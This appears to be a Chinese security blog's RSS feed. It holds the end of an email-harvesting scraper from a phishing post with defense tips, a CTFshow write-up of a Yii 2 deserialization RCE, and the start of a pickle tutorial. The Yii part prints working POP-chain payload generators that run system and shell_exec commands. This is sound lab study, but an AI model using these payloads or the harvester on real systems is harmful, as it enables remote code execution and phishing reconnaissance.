            self.result = self.func(*self.args)  # 在执行函数的同时，把结果赋值给result,然后通过get_result函数获取返回的结果

    def get_result(self):
        try:
            return self.result
        except Exception as e:
            return None


def threader(url,pages):
    launcher(url,pages)

    #漏洞回调函数
def launcher(url,pages):
    if len(pages)&amp;lt; 1:
        pass
    else:
        for page in range(1,int(pages)+1):
            keyword(url,page)


def keyword(url,page):
    threads = []
    email_sum = []
    email_num = []
    key_words = [&#39;email&#39;, &#39;mail&#39;, &#39;mailbox&#39;, &#39;邮件&#39;, &#39;邮箱&#39;, &#39;postbox&#39;]
    for key_word in key_words:
        t = MyThread(emails, args=(url, page,key_word))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()  # 一定执行join,等待子进程执行结束，主进程再往下执行
        email_num.append(t.get_result())
    for email in email_num:
        for list in email:
            if list in email_sum:
                pass
            else:
                email_sum.append(list)
                print(list)

def emails(url,page,key_word):
    bing_emails = bing_search(url, page, key_word)
    baidu_emails = baidu_search(url, page, key_word)
    sum_emails = bing_emails + baidu_emails
    return sum_emails



def bing_search(url,page,key_word):
    referer = &amp;quot;http://cn.bing.com/search?q=email+site%3abaidu.com&amp;amp;qs=n&amp;amp;sp=-1&amp;amp;pq=emailsite%3abaidu.com&amp;amp;first=1&amp;amp;FORM=PERE1&amp;quot;
    conn = requests.session()
    bing_url = &amp;quot;http://cn.bing.com/search?q=&amp;quot; + key_word + &amp;quot;+site%3a&amp;quot; + url + &amp;quot;&amp;amp;qs=n&amp;amp;sp=-1&amp;amp;pq=&amp;quot; + key_word + &amp;quot;site%3a&amp;quot; + url + &amp;quot;&amp;amp;first=&amp;quot; + str(
        (page-1)*10) + &amp;quot;&amp;amp;FORM=PERE1&amp;quot;
    conn.get(&#39;http://cn.bing.com&#39;, headers=headers(referer))
    r = conn.get(bing_url, stream=True, headers=headers(referer), timeout=8)
    emails = search_email(r.text)
    return emails

def baidu_search(url,page,key_word):
    email_list = []
    emails = []
    referer = &amp;quot;https://www.baidu.com/s?wd=email+site%3Abaidu.com&amp;amp;pn=1&amp;quot;
    baidu_url = &amp;quot;https://www.baidu.com/s?wd=&amp;quot;+key_word+&amp;quot;+site%3A&amp;quot;+url+&amp;quot;&amp;amp;pn=&amp;quot;+str((page-1)*10)
    conn = requests.session()
    conn.get(referer,headers=headers(referer))
    r = conn.get(baidu_url, headers=headers(referer))
    soup = BeautifulSoup(r.text, &#39;lxml&#39;)
    tagh3 = soup.find_all(&#39;h3&#39;)
    for h3 in tagh3:
        href = h3.find(&#39;a&#39;).get(&#39;href&#39;)
        try:
            r = requests.get(href, headers=headers(referer),timeout=8)
            emails = search_email(r.text)
        except Exception as e:
            pass
        for email in emails:
            email_list.append(email)
    return email_list

def search_email(html):
    emails = re.findall(r&amp;quot;[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+&amp;quot;,html,re.I)
    return emails

def headers(referer):
    headers = &amp;#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&#39;,
               &#39;Accept&#39;: &#39;*/*&#39;,
               &#39;Accept-Language&#39;: &#39;en-US,en;q=0.5&#39;,
               &#39;Accept-Encoding&#39;: &#39;gzip,deflate&#39;,
               &#39;Referer&#39;: referer
               &amp;#125;
    return headers


if __name__ == &#39;__main__&#39;:
    #定义异常
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print(&amp;quot;interrupted by user, killing all threads...&amp;quot;)
    
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;邮件钓鱼的防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#邮件钓鱼的防御&#34;&gt;#&lt;/a&gt; 邮件钓鱼的防御&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;尽量避免直接点击邮件中的网络连接以及附件文件；&lt;/li&gt;
&lt;li&gt;回复邮件时，如果回复的地址与发信人不同，要谨慎对待；&lt;/li&gt;
&lt;li&gt;对于要求提供任何关于自己隐私（如：账号名、口令、银行账号等）的邮件，要谨慎对待；&lt;/li&gt;
&lt;li&gt;不要使用很简单的口令；&lt;/li&gt;
&lt;li&gt;尽量不要使用同一个口令，不同的账号，使用不同的口令；&lt;/li&gt;
&lt;li&gt;邮件系统要及时清理；&lt;/li&gt;
&lt;li&gt;公司邮件系统安装部署安全邮件网关&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;​&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/03/11/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
            <title>yii反序列化</title>
            <link>https://blog.xcu.icu/2023/03/11/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
            <category term="CTFshow" scheme="https://blog.xcu.icu/categories/CTFshow/" />
            <category term="yii反序列化" scheme="https://blog.xcu.icu/tags/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" />
            <pubDate>Sat, 11 Mar 2023 12:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;CTFshow 做到这一块了，先简单的记录一下对 pop 链的构建，然后借助题来练习一下&lt;/p&gt;
&lt;p&gt;文章参考&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueWlpY2hpbmEuY29tL3R1dG9yaWFsLzEyMQ==&#34;&gt; Yii2.0 路由（Route）的实现原理 - 教程 - Yii Framework 中文网 (yiichina.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU3NjcyNS9hcnRpY2xlL2RldGFpbHMvMTIzOTg2ODE5&#34;&gt;(66 条消息) yii 反序列化漏洞复现及利用_yii 漏洞_拓海 AE 的博客 - CSDN 博客&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;yii框架&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#yii框架&#34;&gt;#&lt;/a&gt; yii 框架&lt;/h2&gt;
&lt;p&gt;yii 是一个适用于 web2.0 的应用开发 php 框架&lt;br /&gt;
 yii 是一个通用的 web 编程框架，即可以开发各种用 PHP 构建的 web 应用。因为基于组件的框架结构，比较适合大型应用开发，现在主要使用的是 2.0 这个重写的版本，它使用了 php 的命名空间和特质的特性&lt;/p&gt;
&lt;h2 id=&#34;漏洞描述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞描述&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;yii2.2.0.38 之前的版本存在反序列化漏洞，程序在调用 unserialize 时，我们可以通过构造特定的 payload 来进行 rce&lt;/p&gt;
&lt;h2 id=&#34;环境搭建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境搭建&#34;&gt;#&lt;/a&gt; 环境搭建&lt;/h2&gt;
&lt;p&gt;选择的版本是 2.0.37&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3lpaXNvZnQveWlpMi9yZWxlYXNlcy90YWcvMi4wLjM3&#34;&gt;Release 2.0.37 · yiisoft/yii2 · GitHub&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303082128415.png&#34; alt=&#34;image-20230308212823338&#34; /&gt;&lt;/p&gt;
&lt;p&gt;在 config/web.php 文件的 cookieValidationKey 为一个值（这个值为一个随机的值就可以了，不然会报错 狗头.jpg）&lt;/p&gt;
&lt;p&gt;在文件中有一个 yii 文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091010504.png&#34; alt=&#34;image-20230309101038399&#34; /&gt;&lt;/p&gt;
&lt;p&gt;运行这个文件就可以开启这个服务&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091015862.png&#34; alt=&#34;image-20230309101540820&#34; /&gt;&lt;/p&gt;
&lt;p&gt;访问给的这个地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091017019.png&#34; alt=&#34;image-20230309101720932&#34; /&gt;&lt;/p&gt;
&lt;p&gt;到此，一个简单的复现环境就搭建好了&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现2037&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞复现2037&#34;&gt;#&lt;/a&gt; 漏洞复现 2.0.37&lt;/h2&gt;
&lt;p&gt;环境搭建好了就开始构造利用&lt;/p&gt;
&lt;h3 id=&#34;知识点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#知识点&#34;&gt;#&lt;/a&gt; 知识点&lt;/h3&gt;
&lt;p&gt;这里主要简单记录一下以前写笔记时没有记录到的知识点&lt;/p&gt;
&lt;h4 id=&#34;命名空间&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命名空间&#34;&gt;#&lt;/a&gt; 命名空间&lt;/h4&gt;
&lt;p&gt;PHP 的命名空间是一种用于解决命名冲突问题的技术。它可以让开发者在同一个程序中使用相同的类名、函数名或常量名，而不会发生命名冲突的问题。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;空间成员&lt;/code&gt; ：这里空间成员是指空间所影响的（只影响类，函数，常量）&lt;/p&gt;
&lt;p&gt;空间成员的访问：&lt;/p&gt;
&lt;p&gt;一个 php 文件中，第一个空间的定义义必须放在第 1 行。如果所要定义的空间已存在，则是进入空间&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
namespace app;

function test()&amp;#123;
    echo 1;
&amp;#125;
test();//app\test()
namespace app\assets;

function test()&amp;#123;
    echo 2;
&amp;#125;

test();//app\assets\test()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 PHP 中，命名空间可以通过关键字  &lt;code&gt;namespace&lt;/code&gt;  来定义。例如，下面的代码定义了命名空间  &lt;code&gt;MyNamespace&lt;/code&gt; ：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;namespace MyNamespace;

class MyClass &amp;#123;
    // class definition
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在定义了命名空间之后，我们可以使用完全限定名称（Fully Qualified Name）来访问该命名空间中的类、函数或常量。例如，如果要访问上面定义的  &lt;code&gt;MyClass&lt;/code&gt;  类，可以使用以下代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$obj = new \MyNamespace\MyClass();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在上面的代码中， &lt;code&gt;\&lt;/code&gt;  表示根命名空间，因此  &lt;code&gt;\MyNamespace\MyClass&lt;/code&gt;  表示完全限定名称。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;引入空间成员&lt;/code&gt; :&lt;/p&gt;
&lt;p&gt;use 空间名 \ 空间名 【as 别名】：将指定空间引入到当前空间。同可以使用 as 关键字为被引入的空间起个别名。&lt;/p&gt;
&lt;p&gt;use 空间名 \ 空间名 \ 成员类 【as 别名】：将指定的空间中的成员引入到当前空间，引入空间成员只能引入类。&lt;/p&gt;
&lt;h4 id=&#34;路由&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#路由&#34;&gt;#&lt;/a&gt; 路由&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091043533.png&#34; alt=&#34;image-20230309104343460&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里可以看一下日志，可以看到所有的用户请求都是发送给入口脚本  &lt;code&gt;index.php&lt;/code&gt;  来处理的。那么，开发者需要一种高效的判断请求应当采用哪个 controller 哪个 action 进行处理的方法。&lt;/p&gt;
&lt;p&gt;这里并不像是像有些网站那种 https://www.cnblogs.com/LQ-Joker/p/16102371.html 一是过于冗长，二是易出错且难排查，三是日后修改起来容易有遗漏，yii 提供了路由和 URL 管理的组件路由是指 URL 中用于标识用于处理用户请求的 module, controller, action 的部分，一般情况下由  &lt;code&gt;r&lt;/code&gt;  查询参数来指定。如 &lt;code&gt;http://www.digpage.com/index.php?r=post/view&amp;amp;id=100&lt;/code&gt;  ，表示这个请求将由 PostController 的 actionView 来处理。&lt;/p&gt;
&lt;p&gt;更多的可以膜拜一下上面路由原理教程&lt;/p&gt;
&lt;h3 id=&#34;复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现&#34;&gt;#&lt;/a&gt; 复现&lt;/h3&gt;
&lt;p&gt;我们利用的是反序列化漏洞，所以我们需要构建一个反序列化的入口&lt;/p&gt;
&lt;p&gt;在 Controllers 下面创建一个 TestController 文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

namespace app\controllers;

class TestController extends \yii\web\Controller
&amp;#123;
    public function actionTest($data)
    &amp;#123;
        return unserialize(base64_decode($data));
    &amp;#125;

&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;漏洞利用点， &lt;code&gt;basic/vendor/yiisoft/yii2/db/BatchQueryResult.php&lt;/code&gt;  这个文件下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    public function __destruct()
    &amp;#123;
        // make sure cursor is closed
        $this-&amp;gt;reset();
    &amp;#125;

    /**
     * Resets the batch query.
     * This method will clean up the existing batch query so that a new batch query can be performed.
     */
    public function reset()
    &amp;#123;
        if ($this-&amp;gt;_dataReader !== null) &amp;#123;
            $this-&amp;gt;_dataReader-&amp;gt;close();
        &amp;#125;
        $this-&amp;gt;_dataReader = null;
        $this-&amp;gt;_batch = null;
        $this-&amp;gt;_value = null;
        $this-&amp;gt;_key = null;
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里有一个__destruct 函数，通过反序列化会自动调用这个函数，跟到下一步 reset ()，这里只有一个 close 可以跟进&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092047714.png&#34; alt=&#34;image-20230309204712681&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里继续跟进&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092048710.png&#34; alt=&#34;image-20230309204809681&#34; /&gt;&lt;/p&gt;
&lt;p&gt;没有发现可以利用的点，这里可以控制 $this-&amp;gt;_dataReader，使用一个别的类中没有的参数，可以触发 &lt;code&gt;__call&lt;/code&gt;  方法来进行利用。__call 函数的当调用一个不存在或者不可调用的方法的时候会自动调用，全局收索一下，那些地方有__call 函数可以利用，在 &lt;code&gt;basic/vendor/fzaninotto/faker/src/Faker/Generator.php&lt;/code&gt;  这个文件下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092034885.png&#34; alt=&#34;image-20230309203444834&#34; /&gt;&lt;/p&gt;
&lt;p&gt;至于为什么选用这个函数，我们再进一步，查看 format 函数&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092035551.png&#34; alt=&#34;image-20230309203513523&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里有一个回调函数，如果里面的参数可控这里就可以直接利用了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;call_user_func_array(callable $callback, array $param_arr): mixed 
callback
    被调用的回调函数。
param_arr
    要被传入回调函数的数组，这个数组得是索引数组。
    
function a($b, $c) &amp;#123;  
    echo $b; 
	echo $c; 
&amp;#125; 
call_user_func_array(&#39;a&#39;, array(&amp;quot;111&amp;quot;, &amp;quot;222&amp;quot;)); 
//输出 111 222
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;接着跟进 getFormatter 函数&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092040954.png&#34; alt=&#34;image-20230309204059909&#34; /&gt;&lt;/p&gt;
&lt;p&gt;在第一个 if 语句就可以看到，这里对上面回调函数中的第一个参数是可控的，后一个参数这个函数写为空值了&lt;/p&gt;
&lt;p&gt;这里需要一个类，可以命令执行，这里看到师傅们用的是 call_user_func&lt;/p&gt;
&lt;p&gt;这里全局找一下带有 call_user_func 的类，这里找到两个参数可控的类&lt;/p&gt;
&lt;p&gt;&lt;code&gt;basic/vendor/yiisoft/yii2/rest/IndexAction.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092133955.png&#34; alt=&#34;image-20230309213304905&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;basic/vendor/yiisoft/yii2/rest/CreateAction.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092133649.png&#34; alt=&#34;image-20230309213342624&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这两个类都可以使用，pop 链还是比较好构造的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;yii\db\BatchQueryResult::__destruct()-&amp;gt;reset()-&amp;gt;close()
↓↓↓
Fake\Generator::__call()-&amp;gt;format()-&amp;gt;call_user_func_array
↓↓↓
yii\rest\IndexAction::run()-&amp;gt;call_user_func
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Payload：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
namespace yii\rest&amp;#123;
    class IndexAction&amp;#123;
        public $checkAccess=&amp;quot;phpinfo&amp;quot;; //调用的函数
        public $id=&amp;quot;1&amp;quot;;			//函数中的参数
    &amp;#125;
&amp;#125;

namespace Faker&amp;#123;
    use yii\rest\IndexAction;

    class Generator&amp;#123;
        protected $formatters;
        public function __construct()
        &amp;#123;
            $this-&amp;gt;formatters[&#39;close&#39;] = [new IndexAction(),&#39;run&#39;];
        &amp;#125;
    &amp;#125;
&amp;#125;

namespace yii\db&amp;#123;
    use Faker\Generator;

    class BatchQueryResult&amp;#123;
        private $_dataReader;
        public function __construct()
        &amp;#123;
            $this-&amp;gt;_dataReader = new Generator();
        &amp;#125;
    &amp;#125;

&amp;#125;

namespace &amp;#123;

    use yii\db\BatchQueryResult;

    echo base64_encode(serialize(new BatchQueryResult()));
&amp;#125;
//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo3OiJwaHBpbmZvIjtzOjI6ImlkIjtzOjE6IjEiO31pOjE7czozOiJydW4iO319fX0=
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100053418.png&#34; alt=&#34;image-20230310005338299&#34; /&gt;&lt;/p&gt;
&lt;p&gt;成功执行 phpinfo，执行一个 ping &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5iYWlkdS5jb20=&#34;&gt;www.baidu.com&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100055463.png&#34; alt=&#34;image-20230310005515376&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;其他pop链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他pop链&#34;&gt;#&lt;/a&gt; 其他 pop 链&lt;/h3&gt;
&lt;p&gt;看到师傅利用别的函数也有 pop 链，学习记录一下&lt;/p&gt;
&lt;p&gt;链子的起点还是 &lt;code&gt;basic/vendor/yiisoft/yii2/db/BatchQueryResult.php&lt;/code&gt;  这个文件下的__destruct 函数，这个 pop 中没有再啊利用 call 魔术方法，而是找到了一个本来就有的 close 函数来实现命令执行，找到的利用函数在 &lt;code&gt;basic/vendor/yiisoft/yii2/web/DbSession.php&lt;/code&gt;  这里&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100111573.png&#34; alt=&#34;image-20230310011115526&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这个函数下面的 composeFields 可以利用&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100111531.png&#34; alt=&#34;image-20230310011105476&#34; /&gt;&lt;/p&gt;
&lt;p&gt;call_user_func 这个函数中的参数也是可控的&lt;/p&gt;
&lt;p&gt;pop:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;yii\db\BatchQueryResult::__destruct()-&amp;gt;reset()-&amp;gt;close()
↓↓↓
yii\web\DbSession::close()-&amp;gt;composeFields()-&amp;gt;call_user_func()
↓↓↓
yii\rest\IndexAction::run()-&amp;gt;call_user_func()

&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
namespace yii\rest&amp;#123;
    class IndexAction&amp;#123;
        public $checkAccess=&amp;quot;system&amp;quot;;
        public $id=&amp;quot;ping www.baidu.com&amp;quot;;
    &amp;#125;
&amp;#125;

namespace yii\web&amp;#123;
    use yii\rest\IndexAction;
    class DbSession&amp;#123;
        public $writeCallback;
        public function __construct()&amp;#123;
            $this-&amp;gt;writeCallback = [new IndexAction(),&#39;run&#39;];
        &amp;#125;
        
    &amp;#125;
&amp;#125;

namespace yii\db&amp;#123;
    use yii\web\DbSession;

    class BatchQueryResult&amp;#123;
        private $_dataReader;
        public function __construct()
        &amp;#123;
            $this-&amp;gt;_dataReader = new DbSession();
        &amp;#125;
    &amp;#125;

&amp;#125;

namespace &amp;#123;
    use yii\db\BatchQueryResult;
    echo base64_encode(serialize(new BatchQueryResult()));
&amp;#125;
//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6MTg6InBpbmcgd3d3LmJhaWR1LmNvbSI7fWk6MTtzOjM6InJ1biI7fX19
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100126159.png&#34; alt=&#34;image-20230310012647055&#34; /&gt;&lt;/p&gt;
&lt;p&gt;也是测试成功&lt;/p&gt;
&lt;h2 id=&#34;web267&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web267&#34;&gt;#&lt;/a&gt; web267&lt;/h2&gt;
&lt;p&gt;这里存在弱口令，admin、admin&lt;/p&gt;
&lt;p&gt;登录后在 about 的源码中有提示&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100959022.png&#34; alt=&#34;image-20230310095940986&#34; /&gt;&lt;/p&gt;
&lt;p&gt;get 传入 view-source&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303101000342.png&#34; alt=&#34;image-20230310100033303&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里找到了反序列化的入口，用上面的 poc 直接打就行（这里入口 r=backdoor/shell）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303101003194.png&#34; alt=&#34;image-20230310100348135&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web268-270&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web268-270&#34;&gt;#&lt;/a&gt; web268-270&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
namespace yii\rest &amp;#123;
    class Action
    &amp;#123;
        public $checkAccess;
    &amp;#125;
    class IndexAction
    &amp;#123;
        public function __construct($func, $param)
        &amp;#123;
            $this-&amp;gt;checkAccess = $func;
            $this-&amp;gt;id = $param;
        &amp;#125;
    &amp;#125;
&amp;#125;
namespace yii\web &amp;#123;
    abstract class MultiFieldSession
    &amp;#123;
        public $writeCallback;
    &amp;#125;
    class DbSession extends MultiFieldSession
    &amp;#123;
        public function __construct($func, $param)
        &amp;#123;
            $this-&amp;gt;writeCallback = [new \yii\rest\IndexAction($func, $param), &amp;quot;run&amp;quot;];
        &amp;#125;
    &amp;#125;
&amp;#125;
namespace yii\db &amp;#123;
    use yii\base\BaseObject;
    class BatchQueryResult
    &amp;#123;
        private $_dataReader;
        public function __construct($func, $param)
        &amp;#123;
            $this-&amp;gt;_dataReader = new \yii\web\DbSession($func, $param);
        &amp;#125;
    &amp;#125;
&amp;#125;
namespace &amp;#123;
    $exp = new \yii\db\BatchQueryResult(&#39;shell_exec&#39;, &#39;cp /f* 1.txt&#39;); //此处写命令
    echo(base64_encode(serialize($exp)));
&amp;#125;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;换一个链子就行&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2023/03/08/python%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
            <title>python的序列化和反序列化</title>
            <link>https://blog.xcu.icu/2023/03/08/python%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
            <category term="Python" scheme="https://blog.xcu.icu/categories/Python/" />
            <category term="Python" scheme="https://blog.xcu.icu/tags/Python/" />
            <pubDate>Wed, 08 Mar 2023 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;python的序列化和反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python的序列化和反序列化&#34;&gt;#&lt;/a&gt; python 的序列化和反序列化&lt;/h2&gt;
&lt;p&gt;​	程序运行的过程中，所有对象都是在内存中操作的，当程序一旦执行完毕，对象占有的内存会被收回，如果我们想重复调用这些对象就需要将这些对象持久化储存到内存中，下次运行的时候直接读取相关数据，我们将对象从内存中变成可以持久化储存的数据的过程称为序列化&lt;/p&gt;
&lt;h3 id=&#34;可序列化的对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#可序列化的对象&#34;&gt;#&lt;/a&gt; 可序列化的对象&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;整数、浮点数、复数&lt;/li&gt;
&lt;li&gt;str、byte、bytearray&lt;/li&gt;
&lt;li&gt;只包含可封存对象的集合，包括 tuple、list、set 和 dict&lt;/li&gt;
&lt;li&gt;定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）&lt;/li&gt;
&lt;li&gt;定义在模块最外层的内置函数&lt;/li&gt;
&lt;li&gt;定义在模块最外层的类&lt;/li&gt;
&lt;li&gt;None、True 和 False&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;pickle库和函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pickle库和函数&#34;&gt;#&lt;/a&gt; pickle 库和函数&lt;/h2&gt;
&lt;p&gt;pickle 是 python 语言的一个标准模块，实现了基本数据的序列化和反序列化&lt;br /&gt;
 dumps	将对象反序列化为 bytes 对象&lt;br /&gt;
 dump	将对象反序列化到文件对象，存入文件&lt;/p&gt;
&lt;p&gt;loads	对 bytes 对象进行反序列化&lt;br /&gt;
 load	通过对象反序列化，从文件中读取数据&lt;/p&gt;
&lt;p&gt;首先通过几个例子来看一下几个函数的作用&lt;/p&gt;
&lt;p&gt;dump/load&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#序列化
pickle.dump(obj, file, protocol=None,)
obj表示要进行封装的对象(必填参数）
file表示obj要写入的文件对象
以二进制可写模式打开即wb(必填参数）
#反序列化
pickle.load(file, *, fix_imports=True, encoding=&amp;quot;ASCII&amp;quot;, errors=&amp;quot;strict&amp;quot;, buffers=None)
file文件中读取封存后的对象
以二进制可读模式打开即rb(必填参数)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import pickle
import pickletools
import os

class test(object):
    def __init__(self):
        self.value1=&#39;abc1&#39;
        self.value2=&#39;abc2&#39;

x=test()
file=open(&#39;1.txt&#39;,&#39;wb&#39;)
y=pickle.dump(x,file)
print(file)
file.close()
file1=open(&#39;1.txt&#39;,&#39;rb&#39;)
z=pickle.load(file1)
print(z)
